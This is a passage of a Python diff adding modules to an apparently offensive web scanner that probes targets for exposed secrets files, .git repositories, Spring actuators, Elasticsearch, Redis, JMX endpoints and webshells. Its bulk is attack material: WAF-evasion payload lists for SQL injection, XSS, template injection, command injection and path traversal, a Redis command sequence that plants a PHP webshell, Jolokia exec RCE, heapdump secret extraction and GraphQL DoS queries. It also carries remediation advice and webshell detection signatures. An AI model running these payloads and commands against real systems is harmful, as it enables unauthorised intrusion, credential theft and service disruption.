+                        poc_curl=f"curl -sk '{url}'",
+                        category="Supply Chain",
+                        remediation=(
+                            "Remove manifest from web root. For internal packages: use private registry "
+                            "(Artifactory, GitHub Packages) with scoped namespaces. "
+                            "Add 'private': true to package.json. Use npm config set registry."
+                        )
+                    ))
+            except Exception:
+                pass
+        return profile
+
+
+class CloudflareOriginBypass:
+    """Detect real origin IP via certificate transparency logs and direct connection."""
+    NAME = "Cloudflare Origin Bypass"
+    CT_URL_TMPL = "https://crt.sh/?q=%.{apex}&output=json"
+    SHODAN_DORK = 'ssl.cert.subject.cn:"{host}" http.title:"{title}"'
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        host = profile.host
+        apex = profile.apex
+        bypass_hints = []
+        # Check common origin-reveal paths
+        reveal_paths = [
+            "/cdn-cgi/trace",
+            "/.well-known/security.txt",
+            "/server-status",
+            "/server-info",
+            "/__info",
+            "/actuator/info",
+        ]
+        base = profile.url.rstrip("/")
+        for path in reveal_paths:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in ["ip=", "server=", "colo=", "uag=", "h=", "ts="]):
+                        bypass_hints.append(f"{path}: {body[:120]}")
+            except Exception:
+                pass
+        # Check known historical IPs from DNS records already in profile
+        if profile.ip:
+            bypass_hints.append(f"Current resolved IP: {profile.ip} — test direct connection bypassing WAF/CDN")
+        if profile.subdomains:
+            bypass_hints.append(
+                f"Subdomains discovered: {', '.join(profile.subdomains[:8])} — "
+                "test each for direct-to-origin access bypassing CDN"
+            )
+        if bypass_hints:
+            profile.findings.append(Finding(
+                id="CF-ORIGIN-BYPASS-001",
+                title="Cloudflare/CDN Origin Bypass Attack Surface",
+                severity="MEDIUM",
+                cvss=5.3,
+                cwe="CWE-441",
+                description=(
+                    f"Multiple indicators for Cloudflare/CDN origin IP bypass at {host}. "
+                    "Direct-to-origin connection bypasses WAF rules, rate limiting, and DDoS protection."
+                ),
+                evidence="\n".join(bypass_hints),
+                poc_curl=(
+                    f"# Test direct connection with Host header:\n"
+                    f"curl -sk --resolve '{host}:{profile.ip}' 'https://{host}/' "
+                    f"-H 'Host: {host}'\n"
+                    f"# Check cdn-cgi/trace for origin info:\n"
+                    f"curl -sk '{base}/cdn-cgi/trace'"
+                ),
+                category="CDN Bypass",
+                remediation="Configure Cloudflare to block non-Cloudflare IPs (Cloudflare IP ranges only). Enable authenticated origin pulls. Use Argo Tunnel / Cloudflare Access."
+            ))
+        return profile
+
+
+class WAFBypassPayloadGen:
+    """Generate WAF bypass payload variants for all HIGH/CRITICAL findings."""
+    NAME = "WAF Bypass Payload Generator"
+    BYPASS_TECHNIQUES = {
+        "SQL": [
+            "' /*!UNION*/ /*!SELECT*/ 1,2,3-- -",
+            "' UNION%0aSELECT%0a1,2,3-- -",
+            "' /*!50000UNION*//*!50000SELECT*/ 1,2,3-- -",
+            "%27%20UNION%20SELECT%20NULL,NULL,NULL--",
+            "' OR 1=1/**/--",
+            "';%00SELECT 1,2,3-- -",
+            "' OR 'x'='x",
+            "1' AND '1'='1",
+        ],
+        "XSS": [
+            "<ScRiPt>alert(1)</ScRiPt>",
+            "<img src=x onerror=alert(1)>",
+            "<svg/onload=alert(1)>",
+            "javascript:alert(1)",
+            "<details open ontoggle=alert(1)>",
+            "\"><img src=x onerror=alert`1`>",
+            "';alert(String.fromCharCode(88,83,83))//",
+            "<iframe srcdoc='&#60;script&#62;alert(1)&#60;/script&#62;'>",
+        ],
+        "SSTI": [
+            "${7*7}", "{{7*7}}", "#{7*7}", "<%= 7*7 %>",
+            "{{config}}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
+            "{{''.__class__.__mro__[2].__subclasses__()}}",
+            "{%25+import+os+%25}{{os.popen('id').read()}}",
+        ],
+        "CMDI": [
+            "; id", "| id", "` id `", "$(id)", "&& id",
+            "%0aid", "%0a/bin/sh -c id", ";/bin/sh -c id",
+            "||id", ";id%0a",
+        ],
+        "PATH_TRAVERSAL": [
+            "../../../../etc/passwd",
+            "..%2F..%2F..%2Fetc%2Fpasswd",
+            "..%252F..%252F..%252Fetc%252Fpasswd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "....//....//....//etc/passwd",
+            "..\\..\\..\\..\\windows\\win.ini",
+        ],
+    }
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        high_findings = [f for f in profile.findings
+                         if f.severity in ("CRITICAL", "HIGH")]
+        if not high_findings:
+            return profile
+        for finding in high_findings[:5]:
+            category = finding.category
+            bypass_key = None
+            if "SQL" in category or "sqli" in finding.id.lower():
+                bypass_key = "SQL"
+            elif "XSS" in category:
+                bypass_key = "XSS"
+            elif "SSTI" in category or "Template" in category:
+                bypass_key = "SSTI"
+            elif "Command" in category or "CMDi" in category:
+                bypass_key = "CMDI"
+            elif "LFI" in category or "Path" in category or "Traversal" in category:
+                bypass_key = "PATH_TRAVERSAL"
+            if bypass_key:
+                payloads = self.BYPASS_TECHNIQUES[bypass_key]
+                profile.findings.append(Finding(
+                    id=f"WAF-BYPASS-{bypass_key}-{finding.id[:10]}",
+                    title=f"WAF Bypass Payloads for {finding.title[:50]}",
+                    severity="INFO",
+                    cvss=0.0,
+                    cwe="CWE-693",
+                    description=(
+                        f"Generated {len(payloads)} WAF bypass payload variants for {bypass_key} "
+                        f"finding '{finding.title}'. Replace baseline PoC payload with these variants "
+                        "to evade common WAF signatures (ModSecurity, CloudFlare, Imperva)."
+                    ),
+                    evidence="\n".join(f"  [{i+1}] {p}" for i, p in enumerate(payloads)),
+                    poc_curl=finding.poc_curl,
+                    category="WAF Bypass",
+                    remediation="WAF bypass payloads confirm the underlying vulnerability exists independent of WAF. Fix the root vulnerability; do not rely on WAF as primary defence."
+                ))
+        return profile
+
+
+class WebShellPathDetector:
+    """Enumerate common webshell locations and backdoor artifacts on the target."""
+    NAME = "Webshell Path Detector"
+    WEBSHELL_PATHS = [
+        "/c99.php", "/r57.php", "/b374k.php", "/wso.php", "/alfa.php",
+        "/indoxploit.php", "/cpanel.php", "/bypass.php", "/cmd.php",
+        "/shell.php", "/webshell.php", "/bc.php", "/ek.php", "/1.php",
+        "/2.php", "/x.php", "/test.php", "/info.php", "/phpinfo.php",
+        "/uploads/shell.php", "/upload/1.php", "/files/shell.php",
+        "/tmp/shell.php", "/images/shell.php", "/img/shell.php",
+        "/assets/shell.php", "/static/shell.php", "/media/shell.php",
+        "/include/shell.php", "/includes/shell.php", "/lib/shell.php",
+        "/admin/shell.php", "/wp-content/uploads/shell.php",
+        "/wp-includes/shell.php", "/wp-admin/shell.php",
+        "/joomla/shell.php", "/administrator/shell.php",
+        "/shell.asp", "/shell.aspx", "/cmd.aspx", "/shell.jsp",
+        "/shell.cfm", "/shell.shtml", "/shell.pl", "/shell.cgi",
+        "/.htaccess", "/.htpasswd",
+    ]
+    WEBSHELL_SIGS = [
+        "eval(", "system(", "exec(", "passthru(", "shell_exec(",
+        "assert(", "preg_replace", "base64_decode", "str_rot13",
+        "gzinflate", "gzuncompress", "strrev(", "c99shell",
+        "r57shell", "FilesMan", "WSO ", "b374k", "indoxploit",
+        "Weevely", "cmd=", "command=", "passwd", "shadow",
+        "phpinfo", "GLOBALS", "_REQUEST", "_GET", "_POST",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.WEBSHELL_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    hits = [s for s in self.WEBSHELL_SIGS if s.lower() in body.lower()]
+                    if hits:
+                        profile.findings.append(Finding(
+                            id=f"WEBSHELL-{path.replace('/','_').strip('_')[:20].upper()}",
+                            title=f"Webshell Detected: {path}",
+                            severity="CRITICAL",
+                            cvss=10.0,
+                            cwe="CWE-434",
+                            description=(
+                                f"Webshell signatures detected at {path} (HTTP 200). "
+                                f"Signatures matched: {', '.join(hits[:5])}. "
+                                "Active backdoor — server is compromised."
+                            ),
+                            evidence=f"HTTP 200 | Signatures: {hits[:5]} | Snippet: {body[:150]}",
+                            poc_curl=f"curl -sk '{url}?cmd=id'",
+                            category="Webshell / Backdoor",
+                            remediation="INCIDENT RESPONSE: Remove webshell immediately. Audit server logs for all access. Rotate all credentials. Rebuild server from clean image if compromise suspected. Notify CISO."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class PrivescPathDetector:
+    """Detect Linux privilege escalation hints from API error pages and debug output."""
+    NAME = "Privesc Path Detector"
+    PRIVESC_PATHS = [
+        "/api/debug", "/api/internal", "/debug", "/console",
+        "/actuator/env", "/actuator/configprops", "/actuator/beans",
+        "/api/v1/admin/debug", "/admin/debug", "/server-status",
+        "/server-info", "/__status__", "/_debug", "/phpinfo.php",
+        "/info.php", "/test.php", "/api/info", "/diagnostics",
+    ]
+    PRIVESC_SIGS = [
+        "SUDO_", "sudoers", "/etc/sudoers", "sudo -l",
+        "suid", "setuid", "/etc/cron", "crontab",
+        "PATH=", "LD_PRELOAD", "LD_LIBRARY_PATH",
+        "writable", "777", "chmod 777",
+        "docker.sock", "docker group",
+        "/proc/version", "kernel version",
+        "lxc", "lxd", "namespace",
+        "cap_setuid", "cap_dac_override", "capabilities",
+        "nfs", "no_root_squash",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.PRIVESC_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 500):
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    hits = [s for s in self.PRIVESC_SIGS if s.lower() in body.lower()]
+                    if hits:
+                        profile.findings.append(Finding(
+                            id=f"PRIVESC-HINT-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"Privilege Escalation Path Hints at {path}",
+                            severity="HIGH",
+                            cvss=7.8,
+                            cwe="CWE-269",
+                            description=(
+                                f"Debug/info endpoint {path} reveals privilege escalation indicators: "
+                                f"{', '.join(hits[:5])}. These indicate misconfigured SUID binaries, "
+                                "writable cron jobs, Docker socket access, or Linux capability abuse paths."
+                            ),
+                            evidence=f"Indicators: {hits[:5]}\nSnippet: {body[:200]}",
+                            poc_curl=f"curl -sk '{url}'",
+                            category="Privilege Escalation",
+                            remediation="Disable debug endpoints in production. Remove SUID bits from non-essential binaries. Restrict Docker socket access. Audit cron jobs for world-writable scripts."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class JMXExposedDetector:
+    """Detect exposed JMX endpoints enabling Java MBeans RCE."""
+    NAME = "JMX Exposed Detector"
+    JMX_PATHS = [
+        "/jmxrmi", "/jndi/rmi://", "/actuator/jolokia",
+        "/jolokia", "/jolokia/list", "/jolokia/version",
+        "/jolokia/exec/java.lang:type=Runtime/exec",
+        "/hawtio", "/hawtio/index.html",
+        "/jmx-console", "/jmx-console/HtmlAdaptor",
+        "/invoker/JMXInvokerServlet",
+        "/web-console/Invoker",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.JMX_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in [
+                        "jolokia", "MBean", "java.lang", "JMX",
+                        "hawtio", "Runtime", "ClassLoading",
+                        "MemoryMXBean", "ThreadMXBean", "exec(",
+                        '"value":', '"request":', '"status":200'
+                    ]):
+                        profile.findings.append(Finding(
+                            id=f"JMX-EXPOSED-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"JMX/Jolokia RCE Surface Exposed: {path}",
+                            severity="CRITICAL",
+                            cvss=9.8,
+                            cwe="CWE-284",
+                            description=(
+                                f"Jolokia/JMX endpoint {path} is accessible. "
+                                "Enables Java MBeans RCE via exec MBean, ClassLoader injection, "
+                                "or JNDI LDAP/RMI callback (Log4Shell-style). "
+                                "Full OS command execution on the server."
+                            ),
+                            evidence=body[:200],
+                            poc_curl=(
+                                f"curl -sk '{url}'\n"
+                                f"# RCE via Jolokia exec:\n"
+                                f"curl -sk '{base}/jolokia/exec/java.lang:type=Runtime/exec/id'"
+                            ),
+                            category="JMX / Java RCE",
+                            remediation="Restrict Jolokia to localhost. Add authentication to hawtio. Disable JMX remote port. Apply Spring Boot actuator security configuration."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class SpringActuatorFullExposure:
+    """Detect Spring Boot actuator full exposure — env, heapdump, logfile, shutdown."""
+    NAME = "Spring Actuator Full Exposure"
+    ACTUATOR_PATHS = [
+        ("/actuator",              "Actuator index — all endpoints listed"),
+        ("/actuator/env",          "Environment variables — secrets/credentials"),
+        ("/actuator/configprops",  "Configuration properties — DB passwords, API keys"),
+        ("/actuator/beans",        "Spring beans — full application context"),
+        ("/actuator/mappings",     "Request mappings — full URL routing table"),
+        ("/actuator/heapdump",     "Heap dump — extract secrets from JVM memory"),
+        ("/actuator/threaddump",   "Thread dump — internal state"),
+        ("/actuator/logfile",      "Application log file"),
+        ("/actuator/httptrace",    "HTTP request trace — auth tokens in headers"),
+        ("/actuator/auditevents",  "Security audit events — login attempts"),
+        ("/actuator/shutdown",     "Remote shutdown — POST to kill server"),
+        ("/actuator/restart",      "Remote restart"),
+        ("/actuator/refresh",      "Config refresh — reload remote config"),
+        ("/env",                   "Actuator env (non-prefixed)"),
+        ("/metrics",               "Metrics — request counts, JVM stats"),
+        ("/health",                "Health endpoint — dependency status"),
+        ("/info",                  "Info endpoint — build/git metadata"),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path, desc in self.ACTUATOR_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in [
+                        '"_links"', '"beans"', '"contexts"', '"activeProfiles"',
+                        '"propertySources"', '"mappings"', '"dispatcherServlets"',
+                        "password", "secret", "token", "key", "datasource",
+                        "jdbc:", "redis://", "amqp://", "mongodb://",
+                        "PK\x03\x04",  # ZIP magic (heapdump)
+                    ]):
+                        sev = "CRITICAL" if "heapdump" in path or "env" in path or "shutdown" in path else "HIGH"
+                        profile.findings.append(Finding(
+                            id=f"ACTUATOR-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"Spring Boot Actuator Exposed: {desc}",
+                            severity=sev,
+                            cvss=9.1 if sev == "CRITICAL" else 7.5,
+                            cwe="CWE-200",
+                            description=(
+                                f"Spring Boot Actuator endpoint {path} is accessible without authentication. "
+                                f"{desc}. "
+                                "Heapdump contains all JVM memory including plaintext passwords, tokens, "
+                                "and crypto keys. Env exposes application.properties secrets."
+                            ),
+                            evidence=body[:300],
+                            poc_curl=(
+                                f"curl -sk '{url}'\n"
+                                f"# Extract secrets from heapdump:\n"
+                                f"curl -sk '{base}/actuator/heapdump' -o /tmp/heap.hprof && "
+                                f"strings /tmp/heap.hprof | grep -i 'password\\|secret\\|token\\|key' | head -50"
+                            ),
+                            category="Spring Boot Actuator",
+                            remediation="Apply Spring Security to actuator endpoints. Set management.endpoints.web.exposure.include=health,info only. Require authentication for all actuator paths. Disable heapdump and shutdown endpoints."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class ElasticsearchExposedDetector:
+    """Detect exposed Elasticsearch cluster and enumerate indices."""
+    NAME = "Elasticsearch Exposed Detector"
+    ES_PATHS = [
+        "/_cat/indices?v",
+        "/_cat/nodes?v",
+        "/_cat/aliases?v",
+        "/_cluster/health",
+        "/_cluster/settings",
+        "/_nodes",
+        "/_security/user",
+        "/_xpack/security/user",
+        "/_all/_search?q=*&size=1",
+        "/_mapping",
+        "/_template",
+        "/_snapshot",
+        "/_tasks",
+        "/",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.ES_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in [
+                        '"cluster_name"', '"indices"', '"nodes"',
+                        '"shards"', '"hits"', '"mappings"',
+                        '"version":{', '"number":', '"tagline"',
+                        "You Know, for Search", '"status":"green"',
+                        '"status":"yellow"', '"status":"red"',
+                    ]):
+                        profile.findings.append(Finding(
+                            id=f"ELASTIC-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"Elasticsearch Cluster Exposed: {path}",
+                            severity="CRITICAL",
+                            cvss=9.8,
+                            cwe="CWE-284",
+                            description=(
+                                f"Elasticsearch endpoint {path} is accessible without authentication. "
+                                "Allows full data exfiltration from all indices, cluster takeover, "
+                                "snapshot creation, and remote code execution via Groovy/Painless scripts."
+                            ),
+                            evidence=body[:300],
+                            poc_curl=(
+                                f"curl -sk '{url}'\n"
+                                f"# Dump all indices:\n"
+                                f"curl -sk '{base}/_cat/indices?v'\n"
+                                f"# Search all data:\n"
+                                f"curl -sk '{base}/_all/_search?q=password&size=100'"
+                            ),
+                            category="Database Exposure",
+                            remediation="Enable X-Pack security. Bind Elasticsearch to 127.0.0.1. Add authentication (basic_auth or API key). Apply network-level firewall. Never expose port 9200/9300 publicly."
+                        ))
+                        break
+            except Exception:
+                pass
+        return profile
+
+
+class GitRepoExposedDetector:
+    """Detect exposed .git repository enabling full source code extraction."""
+    NAME = "Git Repo Exposed Detector"
+    GIT_PATHS = [
+        "/.git/HEAD",
+        "/.git/config",
+        "/.git/COMMIT_EDITMSG",
+        "/.git/index",
+        "/.git/logs/HEAD",
+        "/.git/refs/heads/main",
+        "/.git/refs/heads/master",
+        "/.git/refs/heads/develop",
+        "/.git/ORIG_HEAD",
+        "/.git/packed-refs",
+        "/.git/info/exclude",
+        "/.git/description",
+        "/gitdumper.sh",  # check if already dumped
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        git_found = []
+        for path in self.GIT_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in [
+                        "ref: refs/", "[core]", "repositoryformatversion",
+                        "filemode", "bare = false", "logallrefupdates",
+                        "MERGE_MSG", "Initial commit", "[remote",
+                        "[branch", "Unnamed repository"
+                    ]):
+                        git_found.append((path, body[:100]))
+            except Exception:
+                pass
+        if git_found:
+            profile.findings.append(Finding(
+                id="GIT-REPO-EXPOSED-001",
+                title=".git Repository Exposed — Full Source Code Extraction Possible",
+                severity="CRITICAL",
+                cvss=9.8,
+                cwe="CWE-538",
+                description=(
+                    f"Exposed .git directory at {base}/.git/. "
+                    f"Found {len(git_found)} accessible git internals. "
+                    "Full source code, commit history, credentials in code, and "
+                    "internal architecture can be extracted using git-dumper."
+                ),
+                evidence="\n".join(f"  {p}: {s}" for p, s in git_found[:5]),
+                poc_curl=(
+                    f"# Extract full repository:\n"
+                    f"pip install git-dumper && git-dumper '{base}/.git/' /tmp/repo/\n"
+                    f"# Or manually:\n"
+                    f"curl -sk '{base}/.git/config'\n"
+                    f"curl -sk '{base}/.git/HEAD'"
+                ),
+                category="Source Disclosure",
+                remediation="Block access to /.git/ via web server config (Nginx: location ~* /\\.git { deny all; }). Remove .git directory from web root. Use deployment pipelines that exclude .git."
+            ))
+        return profile
+
+
+class EnvFileLeakDetector:
+    """Detect .env, .env.local, .env.production and similar secret file exposure."""
+    NAME = "Env File Leak Detector"
+    ENV_PATHS = [
+        "/.env", "/.env.local", "/.env.production", "/.env.staging",
+        "/.env.development", "/.env.test", "/.env.backup",
+        "/.env.bak", "/.env.old", "/.env.example",
+        "/config/.env", "/app/.env", "/src/.env",
+        "/.env.docker", "/.env.ci", "/.envrc",
+        "/config/database.yml", "/config/application.yml",
+        "/config/secrets.yml", "/config/credentials.yml",
+        "/application.properties", "/application.yml",
+        "/application-prod.properties", "/application-staging.properties",
+        "/config.php", "/configuration.php", "/wp-config.php",
+        "/wp-config.php.bak", "/wp-config.php~", "/web.config",
+        "/appsettings.json", "/appsettings.Production.json",
+        "/.aws/credentials", "/.aws/config",
+        "/credentials.json", "/service-account.json",
+        "/firebase.json", "/.firebaserc",
+    ]
+    SECRET_SIGS = [
+        "DB_PASSWORD", "DB_PASS", "DATABASE_URL", "DATABASE_PASSWORD",
+        "SECRET_KEY", "SECRET", "API_KEY", "API_SECRET",
+        "AWS_ACCESS_KEY", "AWS_SECRET_KEY", "AWS_SESSION_TOKEN",
+        "STRIPE_SECRET", "STRIPE_KEY", "PAYPAL_SECRET",
+        "PRIVATE_KEY", "OAUTH_SECRET", "JWT_SECRET",
+        "MAIL_PASSWORD", "SMTP_PASSWORD", "SENDGRID_API_KEY",
+        "REDIS_PASSWORD", "MONGODB_URI", "POSTGRES_PASSWORD",
+        "PASSWORD", "PASS", "TOKEN", "AUTH",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.ENV_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    hits = [s for s in self.SECRET_SIGS if s in body.upper()]
+                    if hits or "=" in body:
+                        profile.findings.append(Finding(
+                            id=f"ENV-LEAK-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"Environment/Config File Exposed: {path}",
+                            severity="CRITICAL" if hits else "HIGH",
+                            cvss=9.8 if hits else 7.5,
+                            cwe="CWE-538",
+                            description=(
+                                f"Environment file {path} is publicly accessible. "
+                                + (f"Secret keys detected: {', '.join(hits[:5])}. "
+                                   if hits else "Contains KEY=VALUE pairs. ")
+                                + "Exposes database credentials, API keys, cloud credentials, "
+                                "and encryption secrets."
+                            ),
+                            evidence=body[:400],
+                            poc_curl=f"curl -sk '{url}'",
+                            category="Secrets / Config",
+                            remediation="Remove .env files from web root immediately. Rotate ALL exposed secrets. Block .env access in web server config. Use secrets manager (Vault, AWS Secrets Manager, Azure Key Vault) instead of .env files."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class BackupFileLeakDetector:
+    """Detect backup and temporary files exposing source code and configuration."""
+    NAME = "Backup File Leak Detector"
+    BACKUP_EXTS = [".bak", ".old", ".orig", ".backup", ".copy", ".swp",
+                   ".swo", "~", ".tmp", ".temp", ".save", ".1", ".2"]
+    COMMON_TARGETS = [
+        "index", "config", "database", "db", "admin", "login",
+        "app", "application", "main", "core", "api", "auth",
+        "user", "users", "password", "pass", "secret", "key",
+        "settings", "configuration", "web", "server", "site",
+    ]
+    ARCHIVE_PATHS = [
+        "/backup.zip", "/backup.tar.gz", "/backup.tar",
+        "/site.zip", "/www.zip", "/html.zip", "/htdocs.zip",
+        "/public_html.zip", "/web.zip", "/website.zip",
+        "/db.sql", "/database.sql", "/dump.sql", "/backup.sql",
+        "/data.sql", "/mysql.sql", "/postgres.sql",
+        "/backup.tar.bz2", "/src.zip", "/source.zip",
+        "/files.tar.gz", "/export.zip", "/archive.zip",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        probe_paths = self.ARCHIVE_PATHS[:]
+        for name in self.COMMON_TARGETS:
+            for ext in self.BACKUP_EXTS:
+                probe_paths.append(f"/{name}.php{ext}")
+                probe_paths.append(f"/{name}{ext}")
+        for path in probe_paths[:60]:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    ctype = r.headers.get("content-type", "")
+                    body = (r.body or b"")[:200].decode("utf-8", errors="replace")
+                    if (any(sig in body for sig in ["<?php", "password", "secret",
+                                                     "DB_", "define(", "CREATE TABLE",
+                                                     "INSERT INTO", "PK\x03\x04"])
+                            or "zip" in ctype or "gzip" in ctype or "sql" in ctype
+                            or "octet-stream" in ctype):
+                        profile.findings.append(Finding(
+                            id=f"BACKUP-LEAK-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"Backup/Temp File Exposed: {path}",
+                            severity="HIGH",
+                            cvss=7.5,
+                            cwe="CWE-530",
+                            description=(
+                                f"Backup or temporary file {path} is accessible (HTTP 200, {len(r.body or b'')} bytes). "
+                                "May contain source code, database dumps, credentials, or application configuration."
+                            ),
+                            evidence=f"HTTP 200 | Content-Type: {ctype} | Snippet: {body[:100]}",
+                            poc_curl=f"curl -sk -o /tmp/backup '{url}'",
+                            category="Backup Files",
+                            remediation="Delete all backup files from web root. Configure web server to deny access to backup extensions. Automate cleanup in CI/CD pipeline."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class RedisExposedDetector:
+    """Detect Redis exposed without authentication via HTTP and port indicators."""
+    NAME = "Redis Exposed Detector"
+    REDIS_PATHS = [
+        "/redis", "/redis/info", "/api/redis",
+        "/debug/redis", "/admin/redis",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.REDIS_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in [
+                        "redis_version", "used_memory", "connected_clients",
+                        "aof_enabled", "rdb_last_save_time", "keyspace_hits",
+                        "+OK", "-ERR", "+PONG", "redis.clients",
+                    ]):
+                        profile.findings.append(Finding(
+                            id=f"REDIS-EXPOSED-{path.replace('/','_').strip('_')[:16].upper()}",
+                            title=f"Redis Exposed/Proxied at {path}",
+                            severity="CRITICAL",
+                            cvss=9.8,
+                            cwe="CWE-284",
+                            description=(
+                                f"Redis data is accessible at {path}. "
+                                "Unauthenticated Redis allows: full data dump (session tokens, "
+                                "cached credentials), CONFIG SET to write arbitrary files (SSH keys, "
+                                "cron jobs, webshells), and slave replication for persistence."
+                            ),
+                            evidence=body[:200],
+                            poc_curl=(
+                                f"curl -sk '{url}'\n"
+                                f"# Redis RCE via config set + slave:\n"
+                                f"redis-cli -h {profile.host} CONFIG SET dir /var/www/html\n"
+                                f"redis-cli -h {profile.host} CONFIG SET dbfilename shell.php\n"
+                                f'redis-cli -h {profile.host} SET payload "<?php system($_GET[\'cmd\']); ?>"\n'
+                                f"redis-cli -h {profile.host} BGSAVE"
+                            ),
+                            category="Database Exposure",
+                            remediation="Require Redis AUTH. Bind to 127.0.0.1 only. Use Redis ACL. Block port 6379 at firewall. Enable protected-mode. Never proxy Redis commands via HTTP."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class GraphQLBatchDOSDetector:
+    """Detect GraphQL batch DoS / alias amplification attack surface."""
+    NAME = "GraphQL Batch DoS Detector"
+    GQL_ENDPOINTS = ["/graphql", "/api/graphql", "/v1/graphql",
+                     "/query", "/gql", "/api/query", "/graphiql"]
+    BATCH_QUERY_TMPL = (
+        "query BatchDoS {{"
+        + " ".join(f"a{i}: __typename" for i in range(200))
+        + "}}"
+    )
+    NESTED_QUERY = (
+        "query NestedDoS { __type(name: \"Query\") { "
+        "fields { type { fields { type { fields { type { "
+        "fields { name } } } } } } } } }"
+    )
+    INTROSPECT_FRAGMENT = (
+        "query FragmentDoS { ...F } fragment F on Query { ...F }"
+    )
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for ep in self.GQL_ENDPOINTS:
+            url = base + ep
+            for label, query in [
+                ("batch-alias-200", self.BATCH_QUERY_TMPL),
+                ("nested-introspect", self.NESTED_QUERY),
+                ("circular-fragment", self.INTROSPECT_FRAGMENT),
+            ]:
+                try:
+                    payload = json.dumps({"query": query}).encode()
+                    t0 = time.time()
+                    r = _fetch(url, cfg.ua, cfg.timeout + 5, "POST", payload,
+                               {"Content-Type": "application/json"})
+                    elapsed = time.time() - t0
+                    if r and r.status == 200:
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        alias_count = body.count('"a')
+                        if alias_count > 50 or elapsed > 3.0:
+                            profile.findings.append(Finding(
+                                id=f"GQL-BATCHDOS-{label.upper()[:16]}-{ep.replace('/','_')[:8].upper()}",
+                                title=f"GraphQL {label} DoS Surface — {ep}",
+                                severity="HIGH",
+                                cvss=7.5,
+                                cwe="CWE-400",
+                                description=(
+                                    f"GraphQL endpoint {ep} processed {label} query in {elapsed:.1f}s. "
+                                    f"Alias count in response: {alias_count}. "
+                                    "Indicates no query depth limiting, alias limiting, or cost analysis — "
+                                    "enabling resource exhaustion DoS attacks."
+                                ),
+                                evidence=f"Elapsed: {elapsed:.2f}s | Aliases in response: {alias_count} | HTTP {r.status}",
+                                poc_curl=(
+                                    "curl -sk -X POST '" + url + "' "
+                                    "-H 'Content-Type: application/json' "
+                                    "-d '{\"query\": \"" + self.BATCH_QUERY_TMPL[:80] + "...\"}'"
+                                ),
+                                category="GraphQL",
+                                remediation="Implement query depth limiting (max 10), alias limiting (max 20), query complexity analysis, and persisted queries. Use graphql-depth-limit, graphql-query-complexity."
+                            ))
+                except Exception:
+                    pass
+        return profile
+
+
+class FullExploitNarrativeGen:
+    """Synthesize a complete exploit narrative with full attack story and impact."""
+    NAME = "Full Exploit Narrative Generator"
+    NARRATIVES = [
+        {
+            "chain_id": "CHAIN-CLOUD-TAKEOVER",
